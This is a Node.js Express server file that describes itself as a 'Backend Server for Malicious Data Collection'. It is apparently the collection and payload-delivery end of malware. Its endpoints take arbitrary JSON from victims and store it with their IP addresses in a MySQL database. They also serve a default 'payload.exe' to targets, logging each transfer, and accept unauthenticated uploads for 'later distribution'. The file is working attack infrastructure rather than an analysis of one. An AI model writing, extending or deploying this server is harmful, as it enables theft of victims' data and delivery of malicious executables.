/**
 * Backend Server for Malicious Data Collection
 * - Receives JSON data and stores in Aiven Cloud MySQL Database
 * - Handles file transfers (exe files)
 */

const express = require('express');
const mysql = require('mysql2/promise');
const multer = require('multer');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();

// Trust proxy for DigitalOcean App Platform
app.set('trust proxy', true);

// Middleware
app.use(helmet()); // Security headers
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database configuration from .env (MySQL/Aiven)
const dbConfig = {
    host: process.env.DB_HOST,
    port: parseInt(process.env.DB_PORT) || 21011,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    ssl: {
        rejectUnauthorized: false
    }
};

// Server configuration
const PORT = parseInt(process.env.PORT) || 5000;

// Directory for storing executable files
const FILES_DIR = path.join(__dirname, 'files');

// Ensure files directory exists
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, FILES_DIR);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});
const upload = multer({ storage });

// Database connection pool
let pool;

/**
 * Create and return a database connection pool
 */
async function createPool() {
    try {
        pool = mysql.createPool(dbConfig);
        console.log('[✓] Database pool created successfully');
        return pool;
    } catch (error) {
        console.error(`[✗] Database connection error: ${error.message}`);
        throw error;
    }
}

/**
 * Get a connection from the pool
 */
async function getDbConnection() {
    if (!pool) {
        await createPool();
    }
    return pool.getConnection();
}

/**
 * Initialize database tables if they don't exist
 */
async function initDatabase() {
    try {
        const conn = await getDbConnection();
        
        // Create table for storing received data
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS received_data (
                id INT AUTO_INCREMENT PRIMARY KEY,
                data JSON NOT NULL,
                source_ip VARCHAR(50),
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_type VARCHAR(100)
            )
        `);
        
        // Create table for file transfer logs
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS file_transfers (
                id INT AUTO_INCREMENT PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                target_ip VARCHAR(50),
                transferred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status VARCHAR(50) DEFAULT 'pending'
            )
        `);
        
        conn.release();
        console.log('[✓] Database tables initialized successfully');
    } catch (error) {
        console.error(`[✗] Database initialization error: ${error.message}`);
        throw error;
    }
}

// ==================== DATA RECEIVING ENDPOINTS ====================

/**
 * Endpoint to receive JSON data and store in database
 * Expected: JSON body with any structure
 */
app.post('/api/receive', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data || Object.keys(data).length === 0) {
            return res.status(400).json({ error: 'No data provided' });
        }
        
        // Get client IP
        const sourceIp = req.ip || req.connection.remoteAddress;
        
        // Get optional data type from query params
        const dataType = req.query.type || 'general';
        
        // Store in database
        const conn = await getDbConnection();
        
        const [result] = await conn.execute(
            `INSERT INTO received_data (data, source_ip, data_type, received_at)
             VALUES (?, ?, ?, ?)`,
            [JSON.stringify(data), sourceIp, dataType, new Date()]
        );
        
        conn.release();
        
        const recordId = result.insertId;
        console.log(`[*] Data received and stored with ID: ${recordId} from ${sourceIp}`);
        
        return res.status(201).json({
            status: 'success',
            message: 'Data received and stored',
            id: recordId
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to receive multiple JSON records at once
 * Expected: JSON array of objects
 */
app.post('/api/receive/batch', async (req, res) => {
    try {
        const dataList = req.body;
        
        if (!Array.isArray(dataList)) {
            return res.status(400).json({ error: 'Expected JSON array' });
        }
        
        const sourceIp = req.ip || req.connection.remoteAddress;
        const dataType = req.query.type || 'batch';
        
        const conn = await getDbConnection();
        
        const insertedIds = [];
        for (const data of dataList) {
            const [result] = await conn.execute(
                `INSERT INTO received_data (data, source_ip, data_type, received_at)
                 VALUES (?, ?, ?, ?)`,
                [JSON.stringify(data), sourceIp, dataType, new Date()]
            );
            insertedIds.push(result.insertId);
        }
        
        conn.release();
        
        console.log(`[*] Batch data received: ${insertedIds.length} records from ${sourceIp}`);
        
        return res.status(201).json({
            status: 'success',
            message: `${insertedIds.length} records stored`,
            ids: insertedIds
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving batch data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== FILE TRANSFER ENDPOINTS ====================

/**
 * Endpoint to transfer executable file to client
 * Query params: filename (optional, defaults to payload.exe)
 */
app.get('/api/transfer/file', async (req, res) => {
    try {
        const filename = req.query.filename || 'payload.exe';
        const filePath = path.join(FILES_DIR, filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        // Log the transfer
        const targetIp = req.ip || req.connection.remoteAddress;
        
        const conn = await getDbConnection();
        
        await conn.execute(
            `INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
             VALUES (?, ?, ?, ?)`,
            [filename, targetIp, 'completed', new Date()]
        );
        
        conn.release();
        
        console.log(`[*] File '${filename}' transferred to ${targetIp}`);
        
        return res.download(filePath, filename);
        
    } catch (error) {
        console.error(`[✗] Error transferring file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to upload files to server (for later distribution)
 */
app.post('/api/transfer/upload', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file provided' });
        }
        
        console.log(`[*] File '${req.file.originalname}' uploaded successfully`);
        
        return res.status(201).json({
            status: 'success',
            message: 'File uploaded',
            filename: req.file.originalname
        });
        
    } catch (error) {
        console.error(`[✗] Error uploading file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== UTILITY ENDPOINTS ====================

/**
 * Health check endpoint
 */
app.get('/api/health', async (req, res) => {
    try {
        // Test database connection
        const conn = await getDbConnection();
        await conn.execute('SELECT 1');
        conn.release();
        
        return res.status(200).json({
            status: 'healthy',
            database: 'connected',
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        return res.status(500).json({
            status: 'unhealthy',
            database: 'disconnected',
            error: error.message
        });
    }
});

/**
 * Retrieve all stored data (for testing/admin purposes)
 */
app.get('/api/data', async (req, res) => {
    try {
        const conn = await getDbConnection();
        
        const [rows] = await conn.execute(`
            SELECT id, data, source_ip, data_type, received_at 
            FROM received_data 
            ORDER BY received_at DESC
            LIMIT 100
        `);
        
        conn.release();
        
        const data = rows.map(row => ({
            id: row.id,
            data: row.data,
            source_ip: row.source_ip,
            data_type: row.data_type,
            received_at: row.received_at ? row.received_at.toISOString() : null
        }));
        
        return res.status(200).json({ data, count: data.length });
        
    } catch (error) {
        console.error(`[✗] Error retrieving data: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Root endpoint
 */
app.get('/', (req, res) => {
    return res.status(200).json({
        message: 'Backend Server Running',
        endpoints: {
            receive_data: 'POST /api/receive',
            receive_batch: 'POST /api/receive/batch',
            transfer_file: 'GET /api/transfer/file?filename=<name>',
            upload_file: 'POST /api/transfer/upload',
            health_check: 'GET /api/health',
            get_data: 'GET /api/data'
        }
    });
});

// ==================== SERVER STARTUP ====================

async function startServer() {
    console.log(`
    ╔═══════════════════════════════════════════════════════════╗
    ║           Backend Server - Data Collection                ║
    ║                    (Node.js/Express)                      ║
    ║                                                           ║
    ║  Endpoints:                                               ║
    ║  • POST /api/receive      - Receive JSON data             ║
    ║  • POST /api/receive/batch - Receive batch JSON data      ║
    ║  • GET  /api/transfer/file - Download file                ║
    ║  • POST /api/transfer/upload - Upload file                ║
    ║  • GET  /api/health       - Health check                  ║
    ║  • GET  /api/data         - View stored data              ║
    ╚═══════════════════════════════════════════════════════════╝
    `);
    
    // Initialize database
    try {
        await createPool();
        await initDatabase();
    } catch (error) {
        console.log(`[!] Warning: Could not initialize database: ${error.message}`);
        console.log('    Server will start but database operations may fail');
    }
    
    // Start server
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`[*] Starting server on http://0.0.0.0:${PORT}`);
        console.log('[*] Press Ctrl+C to stop the server\n');
    });
}

// Start the server
startServer();

// Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('[*] SIGTERM received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('[*] SIGINT received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

module.exports = { app, initDatabase, PORT, FILES_DIR };
